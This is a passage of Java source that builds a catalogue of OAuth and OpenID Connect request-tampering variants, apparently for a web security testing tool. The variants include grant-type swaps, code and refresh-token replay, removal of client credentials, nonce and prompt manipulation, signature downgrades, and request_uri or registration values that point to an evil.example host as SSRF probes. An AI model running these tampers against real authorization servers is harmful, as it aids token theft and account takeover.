            gt, c -> vary(c, set(c, "grant_type", "client_credentials"))));
        out.add(oa(C, "Grant Type", "Switch to password",
            "grant_type=password — ROPC grant if the endpoint keeps it enabled.",
            gt, c -> vary(c, set(c, "grant_type", "password"))));
        out.add(oa(C, "Grant Type", "Switch to refresh_token",
            "grant_type=refresh_token — tries to mint from a targeted refresh handle.",
            gt, c -> vary(c, set(c, "grant_type", "refresh_token"))));
        out.add(oa(C, "Grant Type", "Remove grant_type",
            "Broken request — reveals default grant behavior on malformed tokens.",
            gt, c -> one(c, remove(c, "grant_type"))));
        out.add(oa(C, "Grant Type", "Empty grant_type",
            "grant_type= — empty-grant leniency check.",
            gt, c -> vary(c, set(c, "grant_type", ""))));
        out.add(oa(R, "Grant Type", "JWT bearer grant",
            "urn:ietf:params:oauth:grant-type:jwt-bearer — RFC 7523 signed assertion grant.",
            gt, c -> vary(c, set(c, "grant_type",
                "urn:ietf:params:oauth:grant-type:jwt-bearer"))));
        out.add(oa(R, "Grant Type", "Device code grant",
            "urn:ietf:params:oauth:grant-type:device_code — headless-device grant confusion.",
            gt, c -> vary(c, set(c, "grant_type",
                "urn:ietf:params:oauth:grant-type:device_code"))));
        out.add(oa(N, "Grant Type", "Token exchange grant",
            "urn:ietf:params:oauth:grant-type:token-exchange — service-to-service elevation.",
            gt, c -> vary(c, set(c, "grant_type",
                "urn:ietf:params:oauth:grant-type:token-exchange"))));
        out.add(oa(N, "Grant Type", "Polluted duplicate grant",
            "Two grant_type values — parser precedence decides which grant executes.",
            gt, c -> one(c, duplicate(c, "grant_type", "client_credentials"))));
        out.add(oa(N, "Grant Type", "Case-differing grant",
            "Authorization_Code — some parsers case-split grants into a second slot.",
            gt, c -> vary(c, set(c, "grant_type", "Authorization_Code"))));

        // ── tokens / consent objects ────────────────────────────────────
        String[] cd = re("code");
        out.add(oa(C, "Consent Objects", "Replace auth code",
            "code=hacktor-code — swapped code acceptance signals untracked redemptions.",
            cd, c -> vary(c, set(c, "code", "hacktor-code"))));
        out.add(oa(C, "Consent Objects", "Remove auth code",
            "Missing code — reveals grant-step enforcement on the exchange.",
            cd, c -> one(c, remove(c, "code"))));
        out.add(oa(R, "Consent Objects", "Duplicate auth code",
            "Code re-sent twice — replay/resurrection probes the single-use contract.",
            cd, c -> one(c, duplicate(c, "code", c.first("code")))));
        out.add(oa(N, "Consent Objects", "Whitespace-padded code",
            "Trailing space in the code — normalization gaps in the redemption lookup.",
            cd, c -> vary(c, set(c, "code", c.first("code") + " "))));
        String[] rt2 = re("refresh_token");
        out.add(oa(C, "Consent Objects", "Remove refresh token",
            "Missing refresh_token — silent-refresh behavior without rotation token.",
            rt2, c -> one(c, remove(c, "refresh_token"))));
        out.add(oa(C, "Consent Objects", "Empty refresh token",
            "refresh_token= — empty-token handling on the refresh grant.",
            rt2, c -> vary(c, set(c, "refresh_token", ""))));
        out.add(oa(N, "Consent Objects", "Replayed refresh",
            "Refresh token duplicated — proves reuse detection vs. rotation.",
            rt2, c -> one(c, duplicate(c, "refresh_token", c.first("refresh_token")))));
        String[] tt = re("token_type");
        out.add(oa(R, "Consent Objects", "MAC token_type",
            "token_type=mac — legacy MAC draft tokens, sometimes still honored.",
            tt, c -> vary(c, set(c, "token_type", "mac"))));
        out.add(oa(R, "Consent Objects", "JWT token_type",
            "token_type=JWT — JWT-flavored bearer tokens, pseudonym vs. self-contained.",
            tt, c -> vary(c, set(c, "token_type", "JWT"))));

        // ── client identity / credentials ───────────────────────────────
        String[] cl = re("client_id");
        out.add(oa(C, "Client Identity", "Remove client_id",
            "Missing client — implicit/private-client fallbacks may proceed untracked.",
            cl, c -> one(c, remove(c, "client_id"))));
        out.add(oa(C, "Client Identity", "Empty client_id",
            "client_id= — empty-identifier acceptance.",
            cl, c -> vary(c, set(c, "client_id", ""))));
        out.add(oa(C, "Client Identity", "Attacker literal",
            "client_id=attacker — unknown-client handling on registration-less backends.",
            cl, c -> vary(c, set(c, "client_id", "attacker"))));
        out.add(oa(R, "Client Identity", "Polluted duplicate client",
            "Second client_id — multi-client read-behavior differs by parser.",
            cl, c -> one(c, duplicate(c, "client_id", "attacker"))));
        out.add(oa(N, "Client Identity", "Case-split client",
            "Client_Id — case-folded identifiers duplicate into a shadow identity.",
            cl, c -> vary(c, set(c, "client_id", "Client_Id"))));
        out.add(oa(N, "Client Identity", "Trailing-space client",
            "client_id with a trailing space — trimming differs between validation and use.",
            cl, c -> vary(c, set(c, "client_id", c.first("client_id") + " "))));
        String[] cs = re("client_secret");
        out.add(oa(C, "Client Identity", "Remove client_secret",
            "Missing secret — public-client fallback skips credential verification.",
            cs, c -> one(c, remove(c, "client_secret"))));
        out.add(oa(C, "Client Identity", "Empty client_secret",
            "client_secret= — empty-secret acceptance on lax confidential clients.",
            cs, c -> vary(c, set(c, "client_secret", ""))));
        out.add(oa(C, "Client Identity", "Literal secret",
            "client_secret=attacker — wrong-secret differentials vs. open authentication.",
            cs, c -> vary(c, set(c, "client_secret", "attacker"))));

        // ── OIDC session / assertions ───────────────────────────────────
        String[] pm = re("prompt");
        out.add(oa(C, "OIDC Session", "Force consent",
            "prompt=consent — re-consents even with a live session; reveals consent scope.",
            pm, c -> vary(c, set(c, "prompt", "consent"))));
        out.add(oa(C, "OIDC Session", "Force login",
            "prompt=login — forces interactive auth; compare vs. silent for SSO behavior.",
            pm, c -> vary(c, set(c, "prompt", "login"))));
        out.add(oa(C, "OIDC Session", "No prompt",
            "prompt=none — silent authentication only; success confirms an active session.",
            pm, c -> vary(c, set(c, "prompt", "none"))));
        out.add(oa(C, "OIDC Session", "select_account",
            "prompt=select_account — account-switching surface for session confusion.",
            pm, c -> vary(c, set(c, "prompt", "select_account"))));
        out.add(oa(C, "OIDC Session", "Remove prompt",
            "Missing prompt — default-prompt behavior (often a blank consent page).",
            pm, c -> one(c, remove(c, "prompt"))));
        out.add(oa(C, "OIDC Session", "Uppercase prompt",
            "PROMPT=CONSENT — case-insensitive parsers diverge from opaque-value ones.",
            pm, c -> vary(c, set(c, "prompt", "CONSENT"))));
        out.add(oa(C, "OIDC Session", "max_age=0",
            "Forces immediate re-auth — session-assertion freshness tests.",
            null, re("max_age"), c -> vary(c, set(c, "max_age", "0"))));
        out.add(oa(C, "OIDC Session", "max_age=-1",
            "Negative max_age — overflow/underflow in session-age math.",
            null, re("max_age"), c -> vary(c, set(c, "max_age", "-1"))));
        out.add(oa(C, "OIDC Session", "Oversized max_age",
            "Very large max_age — session stays valid regardless of age.",
            null, re("max_age"), c -> vary(c, set(c, "max_age", "9999999"))));
        out.add(oa(C, "OIDC Session", "login_hint injection",
            "login_hint=attacker@evil.example — pre-fills a targeted identity.",
            null, re("login_hint"), c -> vary(c, set(c, "login_hint", "attacker@evil.example"))));
        out.add(oa(C, "OIDC Session", "Remove id_token_hint",
            "Missing id_token_hint — logout without the user context token.",
            re("id_token_hint"), NO_ADD, c -> one(c, remove(c, "id_token_hint"))));
        out.add(oa(C, "OIDC Session", "acr_values assertion",
            "acr_values=urn:mace:incommon:iap:silver — requests an assurance level.",
            null, re("acr_values"), c -> vary(c, set(c, "acr_values",
                "urn:mace:incommon:iap:silver"))));
        out.add(oa(N, "OIDC Session", "claims id_token override",
            "claims={\"id_token\":{\"email\":null}} — asks the token to omit claim checks.",
            null, re("claims"), c -> vary(c, set(c, "claims",
                "{\"id_token\":{\"email\":null}}"))));
        out.add(oa(N, "OIDC Session", "claims userinfo override",
            "claims={\"userinfo\":{\"sub\":null}} — requests unverified identity claims.",
            null, re("claims"), c -> vary(c, set(c, "claims",
                "{\"userinfo\":{\"sub\":null}}"))));
        out.add(oa(N, "OIDC Session", "resource scope",
            "resource=https://api.<host> — resource-constrained token confusion.",
            null, re("resource"), c -> vary(c, set(c, "resource", "https://api." + c.host))));
        out.add(oa(N, "OIDC Session", "audience override",
            "audience evil.example — escalates targeted token audiences.",
            null, re("audience"), c -> vary(c, set(c, "audience", "evil.example"))));

        // ── nonce / response mode / transport ───────────────────────────
        String[] nn = re("nonce");
        out.add(oa(C, "OIDC Session", "Remove nonce",
            "Missing nonce — OIDC id_token CSRF protection gap for session-bound tokens.",
            nn, c -> one(c, remove(c, "nonce"))));
        out.add(oa(C, "OIDC Session", "Empty nonce",
            "nonce= — empty-nonce acceptance.",
            nn, c -> vary(c, set(c, "nonce", ""))));
        out.add(oa(C, "OIDC Session", "Fixed nonce",
            "nonce=hacktor — replayable id_token if the IdP skips nonce validation.",
            nn, c -> vary(c, set(c, "nonce", "hacktor"))));
        out.add(oa(N, "OIDC Session", "Add nonce (implicit CSRF)",
            "nonce injected into a stateless flow — forces the nonce contract into view.",
            null, re("nonce"), c -> vary(c, set(c, "nonce", "injected-by-hacktor"))));
        String[] rm = re("response_mode");
        out.add(oa(C, "Transport", "Fragment response_mode",
            "response_mode=fragment — intercepts the token in the URL fragment after flow.",
            rm, c -> vary(c, set(c, "response_mode", "fragment"))));
        out.add(oa(C, "Transport", "Query response_mode",
            "response_mode=query — returns tokens in query, leaking to proxies and logs.",
            rm, c -> vary(c, set(c, "response_mode", "query"))));
        out.add(oa(C, "Transport", "form_post response_mode",
            "response_mode=form_post — POST-delivered tokens to the callback page.",
            rm, c -> vary(c, set(c, "response_mode", "form_post"))));
        out.add(oa(C, "Transport", "Empty response_mode",
            "response_mode= — default channel selection on empty values.",
            rm, c -> vary(c, set(c, "response_mode", ""))));
        out.add(oa(N, "Transport", "Fragment on code flow",
            "response_mode=fragment with response_type=code — non-standard placement.",
            re("response_mode", "response_type"), NO_ADD, c -> vary(c,
                set(c, "response_type", "code"), set(c, "response_mode", "fragment"))));
        String[] dp = re("display");
        out.add(oa(C, "Transport", "popup display",
            "display=popup — popup-channel UX, different consent flow variant.",
            dp, c -> vary(c, set(c, "display", "popup"))));
        out.add(oa(C, "Transport", "touch display",
            "display=touch — mobile consent path for token-skewed flows.",
            dp, c -> vary(c, set(c, "display", "touch"))));
        out.add(oa(C, "Transport", "wap display",
            "display=wap — device-specific consent surface, often less audited.",
            dp, c -> vary(c, set(c, "display", "wap"))));

        // ── JWT request / OIDC artifacts ────────────────────────────────
        String[] idt = re("id_token");
        out.add(oa(C, "OIDC Artifacts", "Remove id_token",
            "Missing id_token — validates the token-presence contract on the flow.",
            idt, c -> one(c, remove(c, "id_token"))));
        out.add(oa(R, "OIDC Artifacts", "Duplicate id_token",
            "Second id_token — audience/issuer checks applied to first-only.",
            idt, c -> one(c, duplicate(c, "id_token", c.first("id_token")))));
        out.add(oa(N, "OIDC Artifacts", "request_uri injection",
            "request_uri=https://evil.example/req.jwt — JAR parametrized authorization request.",
            null, re("request_uri"), c -> vary(c, set(c, "request_uri",
                "https://evil.example/req.jwt"))));
        out.add(oa(N, "OIDC Artifacts", "Empty request object",
            "request= — malformed JWT-secured request acceptance check.",
            null, re("request"), c -> vary(c, set(c, "request", ""))));
        out.add(oa(N, "OIDC Artifacts", "registration hint",
            "registration=https://evil.example/reg.json — dynamic-client SSRF probe.",
            null, re("registration"), c -> vary(c, set(c, "registration",
                "https://evil.example/reg.json"))));

        // ── OAuth 1.0a / legacy signatures ──────────────────────────────
        String[] o1 = re("oauth_consumer_key", "oauth_token", "oauth_signature_method",
            "oauth_version");
        out.add(oa(C, "OAuth 1.0a", "Bump version 1.0a",
            "oauth_version=1.0a — forces the modern signature handbook.",
            o1, c -> c.hasParam("oauth_version")
                ? vary(c, set(c, "oauth_version", "1.0a")) : null));
        out.add(oa(C, "OAuth 1.0a", "Downgrade version 1.0",
            "oauth_version=1.0 — legacy signature block parsing path.",
            o1, c -> c.hasParam("oauth_version")
                ? vary(c, set(c, "oauth_version", "1.0")) : null));
        out.add(oa(C, "OAuth 1.0a", "PLAINTEXT signature",
            "oauth_signature_method=PLAINTEXT — unencrypted shared-secret signatures.",
            o1, c -> c.hasParam("oauth_signature_method")
                ? vary(c, set(c, "oauth_signature_method", "PLAINTEXT")) : null));
        out.add(oa(R, "OAuth 1.0a", "Weak MAC signature",
            "oauth_signature_method=HMAC-MD5 — weak MAC accepted by legacy consumers.",
            o1, c -> c.hasParam("oauth_signature_method")
                ? vary(c, set(c, "oauth_signature_method", "HMAC-MD5")) : null));
        out.add(oa(C, "OAuth 1.0a", "Remove request token",
            "Missing oauth_token — de-scoped request authorization on XAuth backends.",
            o1, c -> c.hasParam("oauth_token")
                ? one(c, remove(c, "oauth_token")) : null));
        out.add(oa(C, "OAuth 1.0a", "Empty consumer key",
            "oauth_consumer_key= — anonymous consumer fallback.",
            o1, c -> c.hasParam("oauth_consumer_key")
                ? vary(c, set(c, "oauth_consumer_key", "")) : null));
        out.add(oa(N, "OAuth 1.0a", "Replay timestamp/nonce",
            "oauth_timestamp=0 with oauth_nonce=hacktor — replayed legacy signatures.",
            o1, c -> {
                Context c2 = c.copy();
                applyVar(c2, new Variant("oauth_timestamp", "0", MODE_SET));
                applyVar(c2, new Variant("oauth_nonce", "hacktor", MODE_SET));
                return one(c, c2);
            }));
        out.add(oa(N, "OAuth 1.0a", "Duplicate signature",
            "Second oauth_signature — validation skips duplicate-keyed params.",
            o1, c -> c.hasParam("oauth_signature")
                ? one(c, duplicate(c, "oauth_signature", "hacktor")) : null));

        return out;
    }

    // ─── Builder sugar ──────────────────────────────────────────────────

    private static final class Variant {
        final String param;
        final String value;
        final int mode;
        Variant(String param, String value, int mode) {
            this.param = param;
            this.value = value;
            this.mode = mode;
        }
    }

    private static final int MODE_SET = 0;
    private static final int MODE_ADD = 1;
    private static final int MODE_REMOVE = 2;
    private static final int MODE_DUP = 3;

    private static void applyVar(Context c, Variant v) {
        switch (v.mode) {
            case MODE_SET: replace(c, v.param, v.value); break;
            case MODE_ADD: add(c, v.param, v.value); break;
            case MODE_REMOVE: remove(c, v.param); break;
            case MODE_DUP: duplicate(c, v.param, v.value); break;
            default: break;
        }
    }

    private static Variant set(Context c, String param, String value) {
        return new Variant(param, value, MODE_SET);
    }

    private static Variant dup(Context c, String param, String value) {
        return new Variant(param, value, MODE_DUP);
    }

    private static List<Context> vary(Context c, Variant... vars) {
        Context v = c.copy();
        for (Variant x : vars) applyVar(v, x);
        return Collections.singletonList(v);
    }

    private static List<Context> one(Context base, Context v) {
        return Collections.singletonList(v);
    }

    private static OauthTech oa(VulnCatalog.Tier tier, String cat, String name, String desc,
            String[] require, Function<Context, List<Context>> gen) {
        return new OauthTech(tier, cat, name, desc, require, NO_ADD, gen);
    }

    private static OauthTech oa(VulnCatalog.Tier tier, String cat, String name, String desc,
            String[] require, String[] addIfAbsent, Function<Context, List<Context>> gen) {
        return new OauthTech(tier, cat, name, desc, require, addIfAbsent, gen);
    }

    // ─── Public counts for UI labelling ─────────────────────────────────

    private static final List<OauthTech> CATALOG = buildCatalog();
    private static final int[] TIER_COUNTS = tierCountsOf(CATALOG);

    /** The immutable, cached tamper catalog. Treat the list as read-only. */
    public static List<OauthTech> catalog() {
        return CATALOG;
    }

    private static int[] tierCountsOf(List<OauthTech> list) {
        int[] counts = new int[3];
        for (OauthTech t : list) {
            switch (t.tier) {
                case CLASSIC: counts[0]++; break;
                case RARE: counts[1]++; break;
                case NOVEL: counts[2]++; break;
                default: break;
            }
        }
        return counts;
    }

    /** Tier counts for UI labelling ({CLASSIC, RARE, NOVEL}); a fresh copy each call. */
    public static int[] tierCounts() {
        return TIER_COUNTS.clone();
    }

    public static int catalogSize() {
        return CATALOG.size();
    }
}